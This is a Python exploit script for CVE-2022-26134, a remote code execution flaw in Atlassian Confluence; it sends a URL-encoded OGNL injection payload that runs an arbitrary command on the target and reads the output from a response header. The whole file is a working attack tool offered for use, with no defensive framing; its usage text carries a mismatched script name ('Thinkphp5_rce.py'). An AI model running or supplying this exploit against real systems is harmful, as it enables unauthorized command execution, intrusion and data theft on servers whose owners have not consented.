import argparse
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main(url,cmd):
    full_url = f"{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"}
    try:
        response = requests.get(full_url, headers=headers, verify=False, allow_redirects=False)
        # response = requests.get(f'{url}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/', headers=headers, verify=False, allow_redirects=False)
    except Exception:
        print(f"[-]{url}请求失败")
        sys.exit(1)
    if response.status_code ==302:
        print(f'Found:{url} // '+ response.headers['X-Cmd-Response'])
    else:
        print(f"[-]{url}不存在漏洞")
if __name__ == "__main__":
    banner = "1"
    print(banner)
    parser = argparse.ArgumentParser(description="CVE--2022-26134",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
        python3 Thinkphp5_rce.py -u http://192.168.0.1
                                         '''))
    parser.add_argument("-u","--url",dest="url",help="input the url,example:http:192.168.0.1")
    parser.add_argument("-c", "--cmd", dest="cmd", help="input the CMD,example:whoami")
    args = parser.parse_args()
    main(args.url,args.cmd)